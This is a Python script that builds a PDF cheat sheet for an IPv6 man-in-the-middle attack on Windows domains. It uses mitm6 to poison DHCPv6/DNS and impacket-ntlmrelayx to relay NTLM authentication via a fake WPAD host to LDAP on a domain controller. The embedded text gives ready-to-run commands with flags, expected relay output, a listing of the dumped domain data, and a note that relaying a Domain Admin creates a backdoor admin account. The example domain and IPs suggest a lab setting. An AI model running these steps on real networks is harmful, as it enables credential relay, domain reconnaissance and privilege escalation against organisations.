#!/usr/bin/env python3
"""Generate the mitm6 cheatsheet PDF."""

import os, math
from reportlab.lib.pagesizes import letter
from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
from reportlab.lib.units import inch
from reportlab.lib import colors
from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, HRFlowable, Table, TableStyle, Flowable

OUT = os.path.join(os.path.dirname(os.path.abspath(__file__)), "mitm6.pdf")

# ── Colors ────────────────────────────────────────────────────────────────────
C_BODY   = colors.HexColor("#2c2c2a")
C_MUTED  = colors.HexColor("#5f5e5a")
C_RED_BG = colors.HexColor("#FAECE7")
C_RED_BR = colors.HexColor("#993C1D")
C_RED_TX = colors.HexColor("#712B13")
C_GRY_BG = colors.HexColor("#F1EFE8")
C_GRY_BR = colors.HexColor("#5F5E5A")
C_BLU_BG = colors.HexColor("#E6F1FB")
C_BLU_BR = colors.HexColor("#185FA5")
C_BLU_TX = colors.HexColor("#0C447C")
C_PUR_BG = colors.HexColor("#e8e0f7")
C_PUR_TX = colors.HexColor("#4A148C")
C_PUR_BR = colors.HexColor("#6c3483")
C_PKU_BG = colors.HexColor("#fde8e8")
C_PKU_TX = colors.HexColor("#7b1a1a")
C_PKU_BR = colors.HexColor("#c0392b")
C_COD_BG = colors.HexColor("#e8f1fb")
C_COD_BR = colors.HexColor("#b3cde8")
C_DIV    = colors.HexColor("#e8e6df")

styles = getSampleStyleSheet()

title_style = ParagraphStyle("Title", parent=styles["Normal"],
    fontSize=18, fontName="Helvetica", spaceAfter=4, textColor=C_BODY)
intro_style = ParagraphStyle("Intro", parent=styles["Normal"],
    fontSize=10, leading=15, textColor=C_MUTED, spaceAfter=14)
label_style = ParagraphStyle("Label", parent=styles["Normal"],
    fontSize=13, fontName="Helvetica-Bold", textColor=C_BODY,
    spaceBefore=14, spaceAfter=5)
body_style = ParagraphStyle("Body", parent=styles["Normal"],
    fontSize=10.5, leading=16, textColor=C_BODY, spaceAfter=4)
note_style = ParagraphStyle("Note", parent=styles["Normal"],
    fontSize=10, leading=14, textColor=C_MUTED, fontName="Helvetica-Oblique", spaceAfter=4)
code_style = ParagraphStyle("Code", parent=styles["Code"],
    fontSize=9.5, leading=14, fontName="Courier",
    backColor=C_COD_BG, borderColor=C_COD_BR, borderWidth=0.5,
    leftIndent=10, rightIndent=10, borderPad=8, spaceAfter=6)
key_style = ParagraphStyle("Key", parent=styles["Normal"],
    fontSize=10.5, leading=16, textColor=C_MUTED, spaceAfter=4)

HR = HRFlowable(width="100%", thickness=0.8, color=C_DIV, spaceAfter=10, spaceBefore=4)

def sp(n=8):
    return Spacer(1, n)

def code_block(text):
    return Paragraph(text.replace("\n", "<br/>").replace("  ", "&nbsp;&nbsp;"), code_style)


# ── Compact tab badge (rounded pill) ─────────────────────────────────────────
class TabBadge(Flowable):
    """Small colored rounded-rect badge like the HTML tab labels."""
    def __init__(self, label, bg, border, tc, keep_open=False):
        Flowable.__init__(self)
        self.label = label
        self.keep_open = keep_open
        self.bg = bg
        self.border = border
        self.tc = tc
        self.height = 18
        self.width = 6.3 * inch  # full available width (badge is left-aligned inside)

    def draw(self):
        c = self.canv
        text = self.label + ("   ⚠ keep open!" if self.keep_open else "")
        c.setFont("Helvetica-Bold", 9)
        text_w = c.stringWidth(text, "Helvetica-Bold", 9)
        pad_h, pad_v, r = 8, 4, 4
        box_w = text_w + pad_h * 2
        box_h = 14
        # rounded rect
        c.setFillColor(self.bg)
        c.setStrokeColor(self.border)
        c.setLineWidth(0.5)
        c.roundRect(0, 0, box_w, box_h, r, fill=1, stroke=1)
        # text
        c.setFillColor(self.tc)
        c.drawString(pad_h, 3, text)

    def wrap(self, availW, availH):
        return availW, self.height


def tab(label, color="red"):
    if color == "red":
        return TabBadge(label, C_PKU_BG, C_PKU_BR, colors.HexColor("#c0392b"), keep_open=True)
    else:
        return TabBadge(label, C_PUR_BG, C_PUR_BR, C_PUR_TX, keep_open=True)


# ── Diagram Flowable (drawn bottom-up for exact height control) ───────────────
class MitmDiagram(Flowable):

    # Layout constants
    PAD_BOT   = 10
    PAD_TOP   = 10
    ACTOR_H   = 40
    GAP       = 14
    STEP_H    = 32
    ARR_AREA  = 34   # space between actors bottom and step-3 top
    BRANCH_H  = 48

    def __init__(self, page_width):
        Flowable.__init__(self)
        # compute exact height needed
        p = self
        branch_top = p.PAD_BOT + p.BRANCH_H
        # 6 steps, bottom to top
        y = branch_top + p.GAP * 2   # gap from branch boxes + branch line area
        for _ in range(6):
            y += p.STEP_H + p.GAP
        actors_bot = y + p.ARR_AREA
        actors_top = actors_bot + p.ACTOR_H
        self._content_h = actors_top + p.PAD_TOP
        self.width  = page_width
        self.height = self._content_h

    def draw(self):
        c   = self.canv
        W   = self.width
        p   = self

        def rbox(x, y, w, h, bg, br, radius=5):
            c.setFillColor(bg); c.setStrokeColor(br); c.setLineWidth(0.6)
            c.roundRect(x, y, w, h, radius, fill=1, stroke=1)

        def txt(x, y, text, size=9, bold=False, color=C_BODY):
            c.setFillColor(color)
            c.setFont("Helvetica-Bold" if bold else "Helvetica", size)
            c.drawCentredString(x, y, text)

        def arrow_down(x, y_top, length, col=C_MUTED):
            c.setStrokeColor(col); c.setLineWidth(1.1); c.setDash()
            y_bot = y_top - length
            c.line(x, y_top, x, y_bot)
            # arrowhead pointing down
            c.setFillColor(col)
            ph = c.beginPath()
            ph.moveTo(x, y_bot)
            ph.lineTo(x - 4, y_bot + 6)
            ph.lineTo(x + 4, y_bot + 6)
            ph.close()
            c.drawPath(ph, fill=1, stroke=0)

        # ── Compute positions bottom-up ────────────────────────────────────────
        y_branch_bot  = p.PAD_BOT
        y_branch_top  = y_branch_bot + p.BRANCH_H
        y_branch_line = y_branch_top + p.GAP

        # step positions (bottom edges), step 8 first from bottom
        step_y = []
        y = y_branch_line + p.GAP
        for _ in range(6):
            step_y.append(y)
            y += p.STEP_H + p.GAP

        y_actors_bot = y + p.ARR_AREA - p.GAP
        y_actors_top = y_actors_bot + p.ACTOR_H

        # ── Actor boxes ───────────────────────────────────────────────────────
        bw = W / 3 - 8
        # Victim
        rbox(0, y_actors_bot, bw, p.ACTOR_H, C_GRY_BG, C_GRY_BR)
        txt(bw/2, y_actors_bot + p.ACTOR_H - 14, "Windows Victim",   bold=True, size=9)
        txt(bw/2, y_actors_bot + 6,               "(IPv6 enabled)",   size=8, color=C_MUTED)
        # Attacker
        ax = W/2 - bw/2
        rbox(ax, y_actors_bot, bw, p.ACTOR_H, C_RED_BG, C_RED_BR)
        txt(W/2, y_actors_bot + p.ACTOR_H - 14, "Attacker (Kali)",   bold=True, size=9, color=C_RED_TX)
        txt(W/2, y_actors_bot + 6,               "mitm6 + ntlmrelayx", size=8, color=C_RED_BR)
        # DC
        rbox(W - bw, y_actors_bot, bw, p.ACTOR_H, C_BLU_BG, C_BLU_BR)
        txt(W - bw/2, y_actors_bot + p.ACTOR_H - 14, "Domain Controller", bold=True, size=9, color=C_BLU_TX)
        txt(W - bw/2, y_actors_bot + 6,               "LDAP / AD",          size=8, color=C_BLU_BR)

        # ── Exchange arrows (between actors, below actor boxes) ───────────────
        mid_x  = (bw + ax) / 2
        arr1_y = y_actors_bot - 10
        arr2_y = y_actors_bot - 22
        # → dashed
        c.setStrokeColor(C_RED_BR); c.setLineWidth(1.0); c.setDash([4, 3])
        c.line(bw + 2, arr1_y, ax - 2, arr1_y); c.setDash()
        txt(mid_x, arr1_y + 3, "① DHCPv6 broadcast", size=7.5, color=C_RED_BR)
        # ← solid
        c.setStrokeColor(C_RED_BR); c.setLineWidth(1.0)
        c.line(ax - 2, arr2_y, bw + 2, arr2_y)
        txt(mid_x, arr2_y - 9, '→ “I’m your IPv6 DNS”', size=7.5, color=C_RED_BR)

        # ── Step boxes (step_y[0]=step8 bottom, step_y[5]=step3 bottom) ──────
        step_defs = [
            # (title, subtitle, bg, br, tc)  — listed top-to-bottom (step3…step8)
            ("③ Victim now uses Attacker as IPv6 DNS",
             "All DNS queries go through the attacker", C_RED_BG, C_RED_BR, C_RED_TX),
            ('④ Victim queries DNS: "where is wpad.force.local?"',
             "Windows does this automatically to find a proxy config", C_GRY_BG, C_GRY_BR, C_BODY),
            ('⑤ mitm6 answers: "wpad = attacker\'s IP"',
             "-wh fakewpad.force.local", C_RED_BG, C_RED_BR, C_RED_TX),
            ("⑥ Victim fetches /wpad.dat → auto-sends NTLM auth",
             "No user interaction — Windows does this silently in the background", C_GRY_BG, C_GRY_BR, C_BODY),
            ("⑦ ntlmrelayx catches NTLM auth → relays to LDAP on DC",
             "-t ldap://192.168.50.10   |   -6", C_RED_BG, C_RED_BR, C_RED_TX),
            ("⑧ DC authenticates → SUCCEED",
             "Domain info dumped into loot folder (users, groups, computers, policies)",
             C_BLU_BG, C_BLU_BR, C_BLU_TX),
        ]
        # step_y[0] = bottom of step8, step_y[5] = bottom of step3
        for i, (title, subtitle, bg, br, tc) in enumerate(reversed(step_defs)):
            sy = step_y[i]
            rbox(0, sy, W, p.STEP_H, bg, br)
            txt(W/2, sy + p.STEP_H - 12, title,    bold=True, size=9,  color=tc)
            txt(W/2, sy + 5,              subtitle,              size=7.5, color=br)
            # arrow up to next step (except top step)
            if i < 5:
                arrow_down(W/2, sy + p.STEP_H + p.GAP - 2, p.GAP - 2, col=C_MUTED)

        # arrow from actor area down to step 3
        arrow_down(W/2, y_actors_bot - 32, p.ARR_AREA - 38, col=C_MUTED)

        # ── Branch ────────────────────────────────────────────────────────────
        # horizontal split line
        c.setStrokeColor(C_MUTED); c.setLineWidth(1.0)
        c.line(W * 0.24, y_branch_line, W * 0.76, y_branch_line)
        # left branch down
        c.line(W * 0.24, y_branch_line, W * 0.24, y_branch_top + 3)
        c.setFillColor(C_MUTED)
        ph = c.beginPath()
        ph.moveTo(W * 0.24, y_branch_top + 2)
        ph.lineTo(W * 0.24 - 4, y_branch_top + 8)
        ph.lineTo(W * 0.24 + 4, y_branch_top + 8)
        ph.close()
        c.drawPath(ph, fill=1, stroke=0)
        # right branch down
        c.setStrokeColor(C_MUTED)
        c.line(W * 0.76, y_branch_line, W * 0.76, y_branch_top + 3)
        ph2 = c.beginPath()
        ph2.moveTo(W * 0.76, y_branch_top + 2)
        ph2.lineTo(W * 0.76 - 4, y_branch_top + 8)
        ph2.lineTo(W * 0.76 + 4, y_branch_top + 8)
        ph2.close()
        c.drawPath(ph2, fill=1, stroke=0)

        # branch boxes
        bxw = W * 0.45
        # Regular user (left)
        rbox(0, y_branch_bot, bxw, p.BRANCH_H, C_PUR_BG, C_PUR_BR)
        txt(bxw/2, y_branch_bot + p.BRANCH_H - 14, "Regular User",        bold=True, size=9,  color=C_PUR_TX)
        txt(bxw/2, y_branch_bot + p.BRANCH_H - 26, "Loot dumped only",                size=8, color=C_PUR_TX)
        txt(bxw/2, y_branch_bot + 6,                "No backdoor account",             size=8, color=C_PUR_TX)
        # Domain Admin (right)
        rbox(W - bxw, y_branch_bot, bxw, p.BRANCH_H, C_PKU_BG, C_PKU_BR)
        txt(W - bxw/2, y_branch_bot + p.BRANCH_H - 14, "Domain Admin",                  bold=True, size=9,  color=C_PKU_TX)
        txt(W - bxw/2, y_branch_bot + p.BRANCH_H - 26, "Loot dumped +",                           size=8, color=C_PKU_TX)
        txt(W - bxw/2, y_branch_bot + 6,                "Backdoor DA account created  ⚠ noisy",    size=7.5, color=C_PKU_BR)

    def wrap(self, availW, availH):
        return self.width, self.height


# ── Build story ───────────────────────────────────────────────────────────────
PAGE_W = letter[0] - 2 * 0.85 * inch   # content width

story = []

story.append(Paragraph("mitm6 — IPv6 MITM Attack Cheat Sheet", title_style))
story.append(Paragraph(
    "Exploit Windows' default-enabled IPv6 to hijack DNS, redirect victims to the attacker, "
    "and relay their NTLM auth to LDAP. Two terminals required — both must stay open. "
    "Replace &lt;placeholders&gt; with your own values.",
    intro_style,
))

story.append(MitmDiagram(PAGE_W))
story.append(sp(14))
story.append(HR)

# How it works
story.append(Paragraph("How it works", label_style))
story.append(Paragraph(
    "Windows machines constantly send DHCPv6 broadcasts looking for an IPv6 gateway — even on "
    "IPv4-only networks. <b>mitm6</b> answers those requests and assigns itself as the victim's "
    "IPv6 DNS server. From that point, any DNS query the victim sends can be answered with the attacker's IP.",
    body_style,
))
story.append(Paragraph(
    "The key trick is <b>WPAD</b> (Web Proxy Auto-Discovery): Windows automatically queries DNS for "
    "<font name='Courier'>wpad.&lt;domain&gt;</font> to find a proxy config. mitm6 points that to the "
    "attacker. The victim's browser fetches <font name='Courier'>/wpad.dat</font> and "
    "<b>automatically authenticates with NTLM</b> — no user interaction needed. "
    "ntlmrelayx catches that auth and relays it to LDAP on the domain controller.",
    body_style,
))
story.append(HR)

# Step 1
story.append(Paragraph("① Start mitm6", label_style))
story.append(Paragraph("Listens for DHCPv6 requests and poisons IPv6 DNS for the target domain.", body_style))
story.append(tab("Tab 1 · mitm6", color="red"))
story.append(code_block(
    "mitm6 -d &lt;domain&gt;\n\n"
    "# Example:\n"
    "mitm6 -d force.local"
))
story.append(Paragraph(
    "<font name='Courier'>-d</font> targets only machines that send DHCPv6 requests for that domain — limits noise.",
    note_style,
))
story.append(HR)

# Step 2
story.append(Paragraph("② Start ntlmrelayx (new tab)", label_style))
story.append(Paragraph(
    "Waits for relayed NTLM auth and forwards it to LDAP on the DC. Dumps domain info into a loot folder.",
    body_style,
))
story.append(tab("Tab 2 · ntlmrelayx", color="purple"))
story.append(code_block(
    "impacket-ntlmrelayx -6 -t ldap://&lt;dc-ip&gt; -wh fakewpad.&lt;domain&gt; -l &lt;lootdir&gt;\n\n"
    "# Example:\n"
    "impacket-ntlmrelayx -6 -t ldap://192.168.50.10 -wh fakewpad.force.local -l loot"
))
story.append(Paragraph("<font name='Courier'>-6</font> — listen on IPv6.", note_style))
story.append(Paragraph(
    "<font name='Courier'>-t ldap://&lt;dc-ip&gt;</font> — relay to LDAP on the DC "
    "(not SMB — SMB signing doesn't protect against this).",
    note_style,
))
story.append(Paragraph(
    "<font name='Courier'>-wh fakewpad.&lt;domain&gt;</font> — fake WPAD hostname. When victims query DNS for wpad, "
    "mitm6 points them here, triggering automatic NTLM auth.",
    note_style,
))
story.append(Paragraph(
    "<font name='Courier'>-l &lt;lootdir&gt;</font> — output folder for dumped domain data. Name it anything.",
    note_style,
))
story.append(HR)

# Step 3
story.append(Paragraph("③ What you'll see when it fires", label_style))
story.append(code_block(
    "[*] (HTTP): Connection from ::ffff:&lt;victim-ip&gt; controlled\n"
    "[*] (HTTP): Authenticating &lt;DOMAIN&gt;/&lt;USER&gt; against ldap://&lt;dc-ip&gt; SUCCEED [1]\n"
    "[*] ldap://&lt;DOMAIN&gt;/&lt;USER&gt;@&lt;dc-ip&gt; [1] → Enumerating relayed user's privileges...\n"
    "[*] ldap://&lt;DOMAIN&gt;/&lt;USER&gt;@&lt;dc-ip&gt; [1] → Dumping domain info for first time\n"
    "[*] ldap://&lt;DOMAIN&gt;/&lt;USER&gt;@&lt;dc-ip&gt; [1] → Domain info dumped into lootdir!"
))
story.append(Paragraph(
    "You'll also see the victim requesting <font name='Courier'>/wpad.dat</font> — that's the WPAD trigger working.",
    note_style,
))
story.append(HR)

# Step 4: DA vs user
story.append(Paragraph("④ Domain Admin vs Regular User — what changes", label_style))
da_data = [
    ["Relayed user", "Outcome"],
    ["Domain Admin",
     "Loot dumped + backdoor user auto-added to Domain Admins.\n"
     "Very noisy — creates a new AD object. May trigger alerts."],
    ["Regular User",
     "Loot dumped only — users, groups, computers, policies.\n"
     "No backdoor created. Still very useful for recon."],
]
da_table = Table(da_data, colWidths=[1.4 * inch, 4.9 * inch])
da_table.setStyle(TableStyle([
    ("BACKGROUND",    (0, 0), (-1, 0), C_GRY_BG),
    ("TEXTCOLOR",     (0, 0), (-1, 0), C_BODY),
    ("FONTNAME",      (0, 0), (-1, 0), "Helvetica-Bold"),
    ("FONTSIZE",      (0, 0), (-1, -1), 9.5),
    ("LEADING",       (0, 0), (-1, -1), 14),
    ("BACKGROUND",    (0, 1), (-1, 1), C_PKU_BG),
    ("TEXTCOLOR",     (0, 1), (-1, 1), C_PKU_TX),
    ("BACKGROUND",    (0, 2), (-1, 2), C_PUR_BG),
    ("TEXTCOLOR",     (0, 2), (-1, 2), C_PUR_TX),
    ("BOX",           (0, 0), (-1, -1), 0.5, C_DIV),
    ("INNERGRID",     (0, 0), (-1, -1), 0.5, C_DIV),
    ("VALIGN",        (0, 0), (-1, -1), "MIDDLE"),
    ("TOPPADDING",    (0, 0), (-1, -1), 6),
    ("BOTTOMPADDING", (0, 0), (-1, -1), 6),
    ("LEFTPADDING",   (0, 0), (-1, -1), 8),
    ("ROUNDEDCORNERS", [4],),
]))
story.append(da_table)
story.append(sp(6))
story.append(HR)

# Step 5: Loot folder
story.append(Paragraph("⑤ The loot folder", label_style))
story.append(Paragraph(
    "Named whatever you passed to <font name='Courier'>-l</font>. Created in the directory you ran "
    "ntlmrelayx from. Each category comes in <font name='Courier'>.grep</font>, "
    "<font name='Courier'>.html</font>, and <font name='Courier'>.json</font> formats:",
    body_style,
))
story.append(code_block(
    "ls ./loot/\n\n"
    "domain_computers.grep/html/json   # machines, OS, hostname, SID, last logon\n"
    "domain_computers_by_os.html       # computers grouped by OS\n"
    "domain_groups.grep/html/json      # all AD groups\n"
    "domain_policy.grep/html/json      # password policies, lockout settings\n"
    "domain_trusts.grep/html/json      # domain trust relationships\n"
    "domain_users.grep/html/json       # all user accounts\n"
    "domain_users_by_group.html        # users grouped by group membership"
))
story.append(Paragraph(
    "The .html files open as readable tables in a browser — great for quick recon. "
    "You get every computer, OS version, last logon time, password policy, and every "
    "user/group in the domain without touching a single machine directly.",
    note_style,
))
story.append(HR)

# Quick ref table
story.append(Paragraph("Quick reference", label_style))
qr_data = [
    ["Flag", "What it does"],
    ["mitm6 -d <domain>",       "Poison DHCPv6/DNS for this domain only"],
    ["-6",                       "Listen on IPv6 (required for mitm6 relay)"],
    ["-t ldap://<dc-ip>",       "Relay target — LDAP on the domain controller"],
    ["-wh fakewpad.<domain>",   "Fake WPAD hostname — triggers automatic NTLM auth from victims"],
    ["-l <lootdir>",            "Output folder for dumped domain data (name it anything)"],
]
qr_table = Table(qr_data, colWidths=[2.2 * inch, 4.1 * inch])
qr_table.setStyle(TableStyle([
    ("BACKGROUND",    (0, 0), (-1, 0), C_GRY_BG),
    ("FONTNAME",      (0, 0), (-1, 0), "Helvetica-Bold"),
    ("FONTNAME",      (0, 1), (0, -1), "Courier"),
    ("FONTSIZE",      (0, 0), (-1, -1), 9.5),
    ("LEADING",       (0, 0), (-1, -1), 14),
    ("BACKGROUND",    (0, 2), (-1, 2), C_GRY_BG),
    ("BACKGROUND",    (0, 4), (-1, 4), C_GRY_BG),
    ("BOX",           (0, 0), (-1, -1), 0.5, C_DIV),
    ("INNERGRID",     (0, 0), (-1, -1), 0.5, C_DIV),
    ("TOPPADDING",    (0, 0), (-1, -1), 5),
    ("BOTTOMPADDING", (0, 0), (-1, -1), 5),
    ("LEFTPADDING",   (0, 0), (-1, -1), 8),
]))
story.append(qr_table)
story.append(sp(14))
story.append(HR)

story.append(Paragraph(
    "<b>Key idea:</b> mitm6 doesn't need any existing foothold — it exploits IPv6 being enabled by "
    "default on Windows. Combined with WPAD, authentication happens automatically in the background "
    "without any user clicking anything. The relay goes to LDAP (not SMB), so SMB signing "
    "doesn't protect against this.",
    key_style,
))

doc = SimpleDocTemplate(
    OUT,
    pagesize=letter,
    leftMargin=0.85 * inch,
    rightMargin=0.85 * inch,
    topMargin=0.85 * inch,
    bottomMargin=0.85 * inch,
    title="mitm6 — IPv6 MITM Attack Cheat Sheet",
    author="Chained Tools",
)
doc.build(story)
print(f"[+] PDF saved: {OUT}")
